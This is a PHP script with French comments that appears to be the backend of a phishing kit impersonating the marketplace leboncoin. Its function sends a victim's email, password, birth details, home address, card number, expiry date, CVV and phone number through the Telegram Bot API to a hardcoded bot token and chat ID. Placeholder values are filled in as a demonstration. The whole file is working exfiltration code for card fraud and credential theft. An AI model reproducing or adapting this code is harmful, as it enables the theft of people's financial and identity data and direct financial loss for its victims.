<?php
// Fonction pour envoyer les informations à Telegram
function sendToTelegram($data) {
    $botToken = '7942341902:AAH-Es10Dc5KgSL6pJpyhMHFzFQvZMsL_HM';
    $chatId = '6970748370';

    // Créer le message formaté
    $message = "🔥 NOUVELLES INFORMATIONS 🔥\n\n";
    $message .= "📧 Email: " . $data['email'] . "\n";
    $message .= "🔑 Mot de passe: " . $data['password'] . "\n";
    $message .= "💰 Prix: " . $data['prix'] . "€\n";
    $message .= "👤 Nom: " . $data['nom'] . "\n";
    $message .= "📅 Date de naissance: " . $data['dob'] . "\n";
    $message .= "📍 Lieu de naissance: " . $data['lieu'] . "\n";
    $message .= "🏠 Adresse: " . $data['addresse'] . "\n";
    $message .= "💳 Carte: " . $data['cc'] . "\n";
    $message .= "📅 Expiration: " . $data['exp'] . "\n";
    $message .= "🔒 CVV: " . $data['cvv'] . "\n";
    $message .= "📱 Téléphone: " . $data['num'] . "\n";
    $message .= "\n🌐 leboncoin";

    // URL de l'API Telegram pour envoyer le message
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";

    // Paramètres de la requête
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    // Initialisation de la requête cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Exécution de la requête
    $response = curl_exec($ch);

    // Vérification des erreurs
    if ($response === false) {
        echo 'Erreur cURL : ' . curl_error($ch);
    } else {
        echo 'Données envoyées avec succès';
    }

    // Fermeture de la connexion cURL
    curl_close($ch);
}

// Exemple de données à envoyer (peut être dynamique, selon ce que vous voulez envoyer)
$data = [
    'email' => 'exemple@example.com',
    'password' => 'password123',
    'prix' => '100',
    'nom' => 'John Doe',
    'dob' => '01-01-1980',
    'lieu' => 'Paris',
    'addresse' => '123 Rue Exemple',
    'cc' => '1234 5678 9876 5432',
    'exp' => '12/25',
    'cvv' => '123',
    'num' => '0123456789'
];

// Appel de la fonction pour envoyer les données
sendToTelegram($data);
?>